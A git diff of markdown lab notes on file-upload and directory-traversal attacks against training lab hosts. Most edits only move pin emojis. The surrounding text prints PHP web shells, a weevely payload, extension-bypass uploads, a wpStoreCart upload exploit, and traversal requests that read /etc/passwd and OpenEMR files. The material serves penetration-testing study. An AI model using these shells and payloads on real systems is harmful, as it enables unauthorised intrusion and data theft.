@@ -49,12 +49,12 @@ The target server has not been properly secured against <u>arbitrary file upload
 
 `whatweb https://m5i7l4fibda6qpa3wlvb3bth0.eu-central-7.attackdefensecloudlabs.com/`:
 ```
-https://m5i7l4fibda6qpa3wlvb3bth0.eu-central-7.attackdefensecloudlabs.com/ [200 OK] Apache[2.4.7], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[172.104.136.144], JQuery, PHP[5.5.9-1ubuntu4.25], 📌 Script, X-Powered-By[PHP/5.5.9-1ubuntu4.25]
+https://m5i7l4fibda6qpa3wlvb3bth0.eu-central-7.attackdefensecloudlabs.com/ [200 OK] Apache[2.4.7], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[172.104.136.144], JQuery, PHP[5.5.9-1ubuntu4.25],📌 Script, X-Powered-By[PHP/5.5.9-1ubuntu4.25]
 ```
 
 `echo '<?php echo "test" ?>' > ./test.php`
 
-![Lab - Vulnerable Apache IV](./assets/file_and_resource_attacks_lab_vulnerable_apache_iv.png)
+![Lab - Vulnerable Apache IV](./assets/06_file_and_resource_attacks_lab_vulnerable_apache_iv.png)
 
 `burpsuite` > `Repeater`
 
@@ -80,10 +80,10 @@ Te: trailers
 Connection: keep-alive
 
 -----------------------------220412119661351292736528440
-Content-Disposition: form-data; name="fileToUpload"; filename="test.php" 📌
-Content-Type: application/x-php 📌
+Content-Disposition: form-data; name="fileToUpload"; filename="test.php"📌
+Content-Type: application/x-php📌
 
-<?php echo "test" ?> 📌
+<?php echo "test" ?>📌
 
 -----------------------------220412119661351292736528440--
 ```
@@ -104,7 +104,7 @@ Content-Length: 4061
 [...]
 
 	<div class="media-body">
-	  <a href='uploads/test.php'>File Uploaded Succesfully</a> 📌                      </div>
+	  <a href='uploads/test.php'>File Uploaded Succesfully</a>📌                       </div>
 
 [...]
 ```
@@ -136,7 +136,7 @@ Starting gobuster in directory enumeration mode
 /phpinfo.php          (Status: 200) [Size: 76509]
 /server-status        (Status: 403) [Size: 345]
 /static               (Status: 301) [Size: 418] [--> http://m5i7l4fibda6qpa3wlvb3bth0.eu-central-7.attackdefensecloudlabs.com/static/]
-/uploads              (Status: 301) [Size: 419] [--> http://m5i7l4fibda6qpa3wlvb3bth0.eu-central-7.attackdefensecloudlabs.com/uploads/] 📌
+/uploads              (Status: 301) [Size: 419] [--> http://m5i7l4fibda6qpa3wlvb3bth0.eu-central-7.attackdefensecloudlabs.com/uploads/]📌
 Progress: 4614 / 4615 (99.98%)
 ===============================================================
 Finished
@@ -186,7 +186,7 @@ Content-Type: application/x-php
 <?php
 $output = shell_exec($_GET["cmd"]);
 echo "<pre>".$output."</pre>"
-?> 📌
+?>📌
 
 -----------------------------220412119661351292736528440--
 ```
@@ -207,14 +207,14 @@ Content-Length: 4062
 [...]
 
 	<div class="media-body">
-	  <a href='uploads/test.php'>File Uploaded Succesfully</a> 📌                      </div>
+	  <a href='uploads/test.php'>File Uploaded Succesfully</a>📌                       </div>
 
 [...]
 ```
 
 `curl -X GET 'https://m5i7l4fibda6qpa3wlvb3bth0.eu-central-7.attackdefensecloudlabs.com/uploads/shell.php?cmd=id'`:
 ```html
-<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)🚩
 </pre>
 ```
 
@@ -243,7 +243,7 @@ The web portal only <u>allows the user to upload files with restricted extension
 
 `whatweb https://nloypzwkgvoaeogqnqkuhgst7.eu-central-5.attackdefensecloudlabs.com/`:
 ```
-https://nloypzwkgvoaeogqnqkuhgst7.eu-central-5.attackdefensecloudlabs.com/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.4.6], IP[172.104.229.221], JQuery, PHP[5.5.9-1ubuntu4.25], 📌 Script, X-Powered-By[PHP/5.5.9-1ubuntu4.25], nginx[1.4.6]
+https://nloypzwkgvoaeogqnqkuhgst7.eu-central-5.attackdefensecloudlabs.com/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.4.6], IP[172.104.229.221], JQuery, PHP[5.5.9-1ubuntu4.25],📌 Script, X-Powered-By[PHP/5.5.9-1ubuntu4.25], nginx[1.4.6]
 ```
 
 `echo '<?php echo "test" ?>' > ./test.php`
@@ -271,10 +271,10 @@ Priority: u=0, i
 Te: trailers
 
 -----------------------------116211012514243033501053474257
-Content-Disposition: form-data; name="fileToUpload"; filename="test.php" 📌
-Content-Type: application/x-php 📌
+Content-Disposition: form-data; name="fileToUpload"; filename="test.php"📌
+Content-Type: application/x-php📌
 
-<?php echo "test" ?> 📌
+<?php echo "test" ?>📌
 
 -----------------------------116211012514243033501053474257--
 ```
@@ -323,10 +323,10 @@ Priority: u=0, i
 Te: trailers
 
 -----------------------------3389900069635376210896551091
-Content-Disposition: form-data; name="fileToUpload"; filename="test.jpg" 📌
-Content-Type: image/jpeg 📌
+Content-Disposition: form-data; name="fileToUpload"; filename="test.jpg"📌
+Content-Type: image/jpeg📌
 
-<?php echo "This is not a real jpg image" ?> 📌
+<?php echo "This is not a real jpg image" ?>📌
 
 -----------------------------3389900069635376210896551091--
 ```
@@ -346,7 +346,7 @@ Content-Length: 4060
 [...]
 
 	<div class="media-body">
-	     <a href='uploads/test.jpg'>File Uploaded Succesfully</a> 📌                   </div>
+	     <a href='uploads/test.jpg'>File Uploaded Succesfully</a>📌                    </div>
 
 [...]
 ```
@@ -372,7 +372,7 @@ Starting gobuster in directory enumeration mode
 /.htpasswd            (Status: 403) [Size: 168]
 /index.php            (Status: 200) [Size: 3398]
 /static               (Status: 301) [Size: 184] [--> http://nloypzwkgvoaeogqnqkuhgst7.eu-central-5.attackdefensecloudlabs.com/static/]
-/uploads              (Status: 301) [Size: 184] [--> http://nloypzwkgvoaeogqnqkuhgst7.eu-central-5.attackdefensecloudlabs.com/uploads/] 📌
+/uploads              (Status: 301) [Size: 184] [--> http://nloypzwkgvoaeogqnqkuhgst7.eu-central-5.attackdefensecloudlabs.com/uploads/]📌
 Progress: 4614 / 4615 (99.98%)
 ===============================================================
 Finished
@@ -402,13 +402,13 @@ Priority: u=0, i
 Te: trailers
 
 -----------------------------3389900069635376210896551091
-Content-Disposition: form-data; name="fileToUpload"; filename="shell.jpg" 📌
+Content-Disposition: form-data; name="fileToUpload"; filename="shell.jpg"📌
 Content-Type: image/jpeg
 
 <?php
 $output = shell_exec($_GET["cmd"]);
 echo "<pre>".$output."</pre>"
-?> 📌
+?>📌
 
 -----------------------------3389900069635376210896551091--
 ```
@@ -429,7 +429,7 @@ Content-Length: 4061
 [...]
 
 	<div class="media-body">
-	     <a href='uploads/test.jpg'>File Uploaded Succesfully</a> 📌                   </div>
+	     <a href='uploads/test.jpg'>File Uploaded Succesfully</a>📌                    </div>
 
 [...]
 ```
@@ -437,7 +437,7 @@ Content-Length: 4061
 `curl -X GET 'https://nloypzwkgvoaeogqnqkuhgst7.eu-central-5.attackdefensecloudlabs.com/uploads/shell.jpg/shell.php?cmd=id'`:
 ```html
 <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</pre> 🚩
+</pre>🚩
 ```
 
 `weevely generate 'password123' ./weevely_shell.jpg`:
@@ -481,8 +481,8 @@ Priority: u=0, i
 Te: trailers
 
 -----------------------------36226146085396895671660538828
-Content-Disposition: form-data; name="fileToUpload"; filename="weevely_shell.jpg" 📌
-Content-Type: image/jpeg 📌
+Content-Disposition: form-data; name="fileToUpload"; filename="weevely_shell.jpg"📌
+Content-Type: image/jpeg📌
 
 <?php include "\160\x68\141\x72\72\57\57".basename(__FILE__)."\57\x78";__HALT_COMPILER(); ?>/
 ```
@@ -503,7 +503,7 @@ Content-Length: 4069
 [...]
 
 	<div class="media-body">
-	     <a href='uploads/test.jpg'>File Uploaded Succesfully</a> 📌                   </div>
+	     <a href='uploads/test.jpg'>File Uploaded Succesfully</a>📌                    </div>
 
 [...]
 ```
@@ -521,7 +521,7 @@ Content-Length: 4069
 [+] to the target. Type :help for more information.
 
 weevely> id
-uid=33(www-data) gid=33(www-data) groups=33(www-data) 🚩
+uid=33(www-data) gid=33(www-data) groups=33(www-data)🚩
 www-data@attackdefense.com:/var/www/html/uploads $
 ```
 
@@ -542,7 +542,7 @@ This example also proves why <u>blacklisting is not considered a good security m
 
 `whatweb https://rx4wzfytquihpo0ce9jpk63gr.eu-central-7.attackdefensecloudlabs.com/`:
 ```
-https://rx4wzfytquihpo0ce9jpk63gr.eu-central-7.attackdefensecloudlabs.com/ [200 OK] Apache, Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[172.104.136.144], JQuery, PHP[5.5.9-1ubuntu4.25], Script, X-Powered-By[PHP/5.5.9-1ubuntu4.25] 📌
+https://rx4wzfytquihpo0ce9jpk63gr.eu-central-7.attackdefensecloudlabs.com/ [200 OK] Apache, Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[172.104.136.144], JQuery, PHP[5.5.9-1ubuntu4.25], Script, X-Powered-By[PHP/5.5.9-1ubuntu4.25]📌
 ```
 
 `echo '<?php echo "test" ?>' > ./test.php`
@@ -570,8 +570,8 @@ Priority: u=0, i
 Te: trailers
 
 -----------------------------3258681235955572122686784594
-Content-Disposition: form-data; name="fileToUpload"; filename="test.php" 📌
-Content-Type: application/x-php 📌
+Content-Disposition: form-data; name="fileToUpload"; filename="test.php"📌
+Content-Type: application/x-php📌
 
 <?php echo "test" ?>
 
@@ -595,7 +595,7 @@ Content-Length: 4061
 [...]
 
 	<div class="media-body">
-	     <a href='uploads/test.jpg'>File Uploaded Succesfully</a> 📌                   </div>
+	     <a href='uploads/test.jpg'>File Uploaded Succesfully</a>📌                   </div>
 
 [...]
 ```
@@ -626,7 +626,7 @@ Starting gobuster in directory enumeration mode
 /phpinfo.php          (Status: 200) [Size: 76222]
 /server-status        (Status: 403) [Size: 215]
 /static               (Status: 301) [Size: 288] [--> http://rx4wzfytquihpo0ce9jpk63gr.eu-central-7.attackdefensecloudlabs.com/static/]
-/uploads              (Status: 301) [Size: 289] [--> http://rx4wzfytquihpo0ce9jpk63gr.eu-central-7.attackdefensecloudlabs.com/uploads/] 📌
+/uploads              (Status: 301) [Size: 289] [--> http://rx4wzfytquihpo0ce9jpk63gr.eu-central-7.attackdefensecloudlabs.com/uploads/]📌
 Progress: 4614 / 4615 (99.98%)
 ===============================================================
 Finished
@@ -663,8 +663,8 @@ Priority: u=0, i
 Te: trailers
 
 -----------------------------119337070515117360592942719626
-Content-Disposition: form-data; name="fileToUpload"; filename="test.php7" 📌
-Content-Type: application/octet-stream 📌
+Content-Disposition: form-data; name="fileToUpload"; filename="test.php7"📌
+Content-Type: application/octet-stream📌
 
 <?php echo "test" ?>
 
@@ -687,7 +687,7 @@ Content-Length: 4062
 [...]
 
 	<div class="media-body">
-	     <a href='uploads/test.jpg'>File Uploaded Succesfully</a> 📌                   </div>
+	     <a href='uploads/test.jpg'>File Uploaded Succesfully</a>📌                   </div>
 
 [...]
 ```
@@ -750,8 +750,8 @@ Priority: u=0, i
 Te: trailers
 
 -----------------------------30586794552660421611961380276
-Content-Disposition: form-data; name="fileToUpload"; filename="simple-backdoor.php7" 📌
-Content-Type: application/octet-stream 📌
+Content-Disposition: form-data; name="fileToUpload"; filename="simple-backdoor.php7"📌
+Content-Type: application/octet-stream📌
 
 <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
 
@@ -765,7 +765,7 @@ if(isset($_REQUEST['cmd'])){
         die;
 }
 
-?> 📌
+?>📌
 
 Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
 
@@ -791,7 +791,7 @@ Content-Length: 4073
 [...]
 
 	<div class="media-body">
-	     <a href='uploads/test.jpg'>File Uploaded Succesfully</a> 📌                   </div>
+	     <a href='uploads/test.jpg'>File Uploaded Succesfully</a>📌                    </div>
 
 [...]
 ```
@@ -801,7 +801,7 @@ Content-Length: 4073
 <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
 
 <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</pre> 🚩
+</pre>🚩
 ```
 
 ### WordPress wpStoreCart File Upload
@@ -820,11 +820,11 @@ In the exercise below, the attacker is unauthenticated to the web application an
 
 #### Lab Solution
 
-![Lab - WordPress wpStoreCart](./assets/file_and_resource_attacks_lab_wordpress_wpstorecart.png)
+![Lab - WordPress wpStoreCart](./assets/06_file_and_resource_attacks_lab_wordpress_wpstorecart.png)
 
 `whatweb https://f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com/`:
 ```
-https://f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com/ [200 OK] Apache[2.4.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[172.104.229.221], JQuery[1.11.3], MetaGenerator[WordPress 4.4], 📌 PHP[5.5.9-1ubuntu4.25], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[wpvuln &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.4], X-Powered-By[PHP/5.5.9-1ubuntu4.25]
+https://f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com/ [200 OK] Apache[2.4.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[172.104.229.221], JQuery[1.11.3], MetaGenerator[WordPress 4.4],📌 PHP[5.5.9-1ubuntu4.25], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[wpvuln &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.4], X-Powered-By[PHP/5.5.9-1ubuntu4.25]
 ```
 
 `wpscan --url https://f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com/`:
@@ -909,14 +909,14 @@ Interesting Finding(s):
 [+] Enumerating All Plugins (via Passive Methods)
 [+] Checking Plugin Versions (via Passive and Aggressive Methods)
 
-[i] Plugin(s) Identified:
+[i] Plugin(s) Identified:📌
 
-[+] wpstorecart 📌
+[+] wpstorecart📌
  | Location: https://f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com/wp-content/plugins/wpstorecart/
  |
  | Found By: Urls In Homepage (Passive Detection)
  |
- | Version: 2.5.29 (100% confidence) 📌
+ | Version: 2.5.29 (100% confidence)📌
  | Found By: Readme - Stable Tag (Aggressive Detection)
  |  - https://f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com/wp-content/plugins/wpstorecart/readme.txt
  | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
@@ -961,7 +961,7 @@ Starting gobuster in directory enumeration mode
 /index.php            (Status: 200) [Size: 0]
 /plugins              (Status: 301) [Size: 430] [--> http://f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com/wp-content/plugins/]
 /themes               (Status: 301) [Size: 429] [--> http://f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com/wp-content/themes/]
-/uploads              (Status: 301) [Size: 430] [--> http://f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com/wp-content/uploads/] 📌
+/uploads              (Status: 301) [Size: 430] [--> http://f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com/wp-content/uploads/]📌
 Progress: 4614 / 4615 (99.98%)
 ===============================================================
 Finished
@@ -980,7 +980,7 @@ Finished
    <tr><th colspan="5"><hr></th></tr>
 <tr><td valign="top"><img alt="[PARENTDIR]" src="/icons/back.gif"></td><td><a href="/wp-content/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
 <tr><td valign="top"><img alt="[DIR]" src="/icons/folder.gif"></td><td><a href="2019/">2019/</a></td><td align="right">2019-07-03 06:55  </td><td align="right">  - </td><td>&nbsp;</td></tr>
-<tr><td valign="top"><img alt="[DIR]" src="/icons/folder.gif"></td><td><a href="wpstorecart/">wpstorecart/</a></td><td align="right">2019-07-03 06:55  </td><td align="right">  - </td><td>&nbsp;</td></tr> 📌
+<tr><td valign="top"><img alt="[DIR]" src="/icons/folder.gif"></td><td><a href="wpstorecart/">wpstorecart/</a></td><td align="right">2019-07-03 06:55  </td><td align="right">  - </td><td>&nbsp;</td></tr>📌
    <tr><th colspan="5"><hr></th></tr>
 </tbody></table>
 <address>Apache/2.4.7 (Ubuntu) Server at f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com Port 80</address>
@@ -1022,10 +1022,10 @@ PostShell.php
 
 $uploadfile="lo.php";
 $ch =
-curl_init("http://www.exemple.com/wordpress/wp-content/plugins/wpstorecart/php/upload.php"); 📌
+curl_init("http://www.exemple.com/wordpress/wp-content/plugins/wpstorecart/php/upload.php");📌
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS,
-         array('Filedata'=>"@$uploadfile")); 📌
+         array('Filedata'=>"@$uploadfile"));📌
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $postResult = curl_exec($ch);
 curl_close($ch);
@@ -1092,7 +1092,7 @@ Stack trace:
    <tbody><tr><th valign="top"><img alt="[ICO]" src="/icons/blank.gif"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
    <tr><th colspan="5"><hr></th></tr>
 <tr><td valign="top"><img alt="[PARENTDIR]" src="/icons/back.gif"></td><td><a href="/wp-content/uploads/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
-<tr><td valign="top"><img alt="[   ]" src="/icons/unknown.gif"></td><td><a href="shell.php">shell.php</a></td><td align="right">2024-11-28 14:52  </td><td align="right"> 75 </td><td>&nbsp;</td></tr> 📌
+<tr><td valign="top"><img alt="[   ]" src="/icons/unknown.gif"></td><td><a href="shell.php">shell.php</a></td><td align="right">2024-11-28 14:52  </td><td align="right"> 75 </td><td>&nbsp;</td></tr>📌
    <tr><th colspan="5"><hr></th></tr>
 </tbody></table>
 <address>Apache/2.4.7 (Ubuntu) Server at f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com Port 80</address>
@@ -1102,7 +1102,7 @@ Stack trace:
 
 `curl 'https://f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com/wp-content/uploads/wpstorecart/shell.php?cmd=id'`:
 ```html
-<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data) 🚩
+<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)🚩
 </pre>
 ```
 
@@ -1144,7 +1144,7 @@ print "$postResult";
 [+] to the target. Type :help for more information.
 
 weevely> id
-uid=33(www-data) gid=33(www-data) groups=33(www-data) 🚩
+uid=33(www-data) gid=33(www-data) groups=33(www-data)🚩
 ```
 ```
 www-data@attackdefense.com:/app/wp-content/uploads/wpstorecart $ :system_info
@@ -1205,7 +1205,7 @@ PWD=/app/wp-content/uploads/wpstorecart
    <tr><th colspan="5"><hr></th></tr>
 <tr><td valign="top"><img alt="[PARENTDIR]" src="/icons/back.gif"></td><td><a href="/wp-content/uploads/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
 <tr><td valign="top"><img alt="[   ]" src="/icons/unknown.gif"></td><td><a href="shell.php">shell.php</a></td><td align="right">2024-11-28 14:52  </td><td align="right"> 75 </td><td>&nbsp;</td></tr>
-<tr><td valign="top"><img alt="[   ]" src="/icons/unknown.gif"></td><td><a href="upload_test.php">upload_test.php</a></td><td align="right">2024-11-28 14:46  </td><td align="right"> 54 </td><td>&nbsp;</td></tr> 📌
+<tr><td valign="top"><img alt="[   ]" src="/icons/unknown.gif"></td><td><a href="upload_test.php">upload_test.php</a></td><td align="right">2024-11-28 14:46  </td><td align="right"> 54 </td><td>&nbsp;</td></tr>📌
    <tr><th colspan="5"><hr></th></tr>
 </tbody></table>
 <address>Apache/2.4.7 (Ubuntu) Server at f3fntfsdrgn4glmki9lin9aib.eu-central-5.attackdefensecloudlabs.com Port 80</address>
@@ -1244,7 +1244,7 @@ The following credentials might be needed:
 `ifconfig eth1`:
 ```
 eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 192.140.162.2 📌 netmask 255.255.255.0  broadcast 192.140.162.255
+        inet 192.140.162.2📌 netmask 255.255.255.0  broadcast 192.140.162.255
         ether 02:42:c0:8c:a2:02  txqueuelen 0  (Ethernet)
         RX packets 15  bytes 1322 (1.2 KiB)
         RX errors 0  dropped 0  overruns 0  frame 0
@@ -1258,16 +1258,16 @@ http://192.140.162.3/ [302 Found] Apache[2.4.7], HTTPServer[Ubuntu Linux][Apache
 
 http://192.140.162.3/portal.php [302 Found] Apache[2.4.7], Cookies[PHPSESSID], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[192.140.162.3], PHP[5.5.9-1ubuntu4.25], RedirectLocation[login.php], X-Powered-By[PHP/5.5.9-1ubuntu4.25]
 
-http://192.140.162.3/login.php [200 OK] Apache[2.4.7], Cookies[PHPSESSID], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], 📌 IP[192.140.162.3], PHP[5.5.9-1ubuntu4.25], PasswordField[password], Script, Title[bWAPP - Login], X-Powered-By[PHP/5.5.9-1ubuntu4.25]
+http://192.140.162.3/login.php [200 OK] Apache[2.4.7], Cookies[PHPSESSID], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)],📌 IP[192.140.162.3], PHP[5.5.9-1ubuntu4.25], PasswordField[password], Script, Title[bWAPP - Login], X-Powered-By[PHP/5.5.9-1ubuntu4.25]
 ```
 
-![Lab - Directory Traversal](./assets/file_and_resource_attacks_lab_directory_traversal_1.png)
+![Lab - Directory Traversal](./assets/06_file_and_resource_attacks_lab_directory_traversal_1.png)
 
 `burpsuite` > `Repeater`
 
 `HTTP Request`:
 ```http
-GET /directory_traversal_1.php?page=../ HTTP/1.1 📌
+GET /directory_traversal_1.php?page=../📌 HTTP/1.1
 Host: 192.140.162.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -1312,7 +1312,7 @@ Content-Type: text/html
 
 `HTTP Request`:
 ```http
-GET /directory_traversal_1.php?page=../../../../../../etc/passwd HTTP/1.1 📌
+GET /directory_traversal_1.php?page=../../../../../../etc/passwd📌 HTTP/1.1
 Host: 192.140.162.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -1373,13 +1373,13 @@ Content-Type: text/html
 [...]
 ```
 
-![Lab - Directory Traversal](./assets/file_and_resource_attacks_lab_directory_traversal_2.png)
+![Lab - Directory Traversal](./assets/06_file_and_resource_attacks_lab_directory_traversal_2.png)
 
 `burpsuite` > `Repeater`
 
 `HTTP Request`:
 ```http
-GET /directory_traversal_2.php?directory=../ HTTP/1.1 📌
+GET /directory_traversal_2.php?directory=../📌 HTTP/1.1
 Host: 192.140.162.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -1424,7 +1424,7 @@ Content-Type: text/html
 
 `HTTP Request`:
 ```http
-GET /directory_traversal_2.php?directory=../../../../../../var/www/html/ HTTP/1.1 📌
+GET /directory_traversal_2.php?directory=../../../../../../var/www/html/📌 HTTP/1.1
 Host: 192.140.162.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -1485,13 +1485,13 @@ The following username and passwords may be used to explore the application and/
 
 #### Lab Solution
 
-![Lab - Directory Traversal](./assets/file_and_resource_attacks_lab_openemr_arbitrary_file_read.png)
+![Lab - Directory Traversal](./assets/06_file_and_resource_attacks_lab_openemr_arbitrary_file_read.png)
 
 `whatweb https://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/`:
 ```
 https://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/ [302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[172.104.136.144], RedirectLocation[interface/login/login.php?site=default]
 
-https://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/interface/login/login.php?site=default [200 OK] Apache[2.4.18], Bootstrap, Cookies[OpenEMR], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], 📌 IP[172.104.136.144], JQuery, probably OpenEMR, 📌 PasswordField[clearPass], Script[text/javascript], Title[OpenEMR Login], X-UA-Compatible[IE=edge]
+https://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/interface/login/login.php?site=default [200 OK] Apache[2.4.18], Bootstrap, Cookies[OpenEMR], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)],📌 IP[172.104.136.144], JQuery, probably OpenEMR,📌 PasswordField[clearPass], Script[text/javascript], Title[OpenEMR Login], X-UA-Compatible[IE=edge]
 ```
 
 `burpsuite` > `Proxy`
@@ -1517,7 +1517,7 @@ Priority: u=0, i
 Te: trailers
 Connection: keep-alive
 
-new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=password&languageChoice=1 📌
+new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=password&languageChoice=1📌
 ```
 `HTTP Response`
 ```http
@@ -1585,14 +1585,12 @@ Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 26
 
-mode=get&docid=/etc/passwd 📌
+mode=get&docid=/etc/passwd📌
 
 [...]
 ```
 
 `burpsuite` > `Repeater`
-
-`.../portal/import_template.php`
 
 `HTTP Request`:
 ```http
@@ -1613,7 +1611,7 @@ Te: trailers
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 26
 
-mode=get&docid=../../../../../../etc/passwd 📌
+mode=get&docid=../../../../../../etc/passwd📌
 ```
 `HTTP Response`:
 ```http
@@ -1651,7 +1649,7 @@ systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
 systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
 _apt:x:104:65534::/nonexistent:/bin/false
 sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
-mysql:x:1000:8378::/home/mysql: 📌
+mysql:x:1000:8378::/home/mysql:📌
 ```
 
 `gobuster dir --url https://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/ --wordlist /usr/share/wordlists/dirb/common.txt`:
@@ -1676,7 +1674,7 @@ Starting gobuster in directory enumeration mode
 /admin.php            (Status: 200) [Size: 937]
 /build                (Status: 200) [Size: 6102]
 /cgi-bin/             (Status: 403) [Size: 348]
-/common               (Status: 301) [Size: 419] [--> http://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/common/] 📌
+/common               (Status: 301) [Size: 419] [--> http://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/common/]📌
 /config               (Status: 301) [Size: 419] [--> http://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/config/]
 /contrib              (Status: 301) [Size: 420] [--> http://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/contrib/]
 /controllers          (Status: 301) [Size: 424] [--> http://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/controllers/]
@@ -1688,7 +1686,7 @@ Starting gobuster in directory enumeration mode
 /interface            (Status: 301) [Size: 422] [--> http://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/interface/]
 /library              (Status: 301) [Size: 420] [--> http://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/library/]
 /modules              (Status: 301) [Size: 420] [--> http://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/modules/]
-/portal               (Status: 301) [Size: 419] [--> http://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/portal/] 📌
+/portal               (Status: 301) [Size: 419] [--> http://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/portal/]📌
 /public               (Status: 301) [Size: 419] [--> http://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/public/]
 /server-status        (Status: 403) [Size: 353]
 /services             (Status: 301) [Size: 421] [--> http://a8hmqro88nfya14sr515fgj87.eu-central-7.attackdefensecloudlabs.com/services/]
@@ -1704,8 +1702,6 @@ Finished
 ```
 
 `burpsuite` > `Repeater`
-
-`.../portal/import_template.php`
 
 `HTTP Request`:
 ```http
@@ -1726,7 +1722,7 @@ Te: trailers
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 43
 
-mode=get&docid=../../../../../../var/www/html/common/database/Connector.php
+mode=get&docid=../../../../../../var/www/html/common/database/Connector.php📌
 ```
 `HTTP Response`:
 ```http
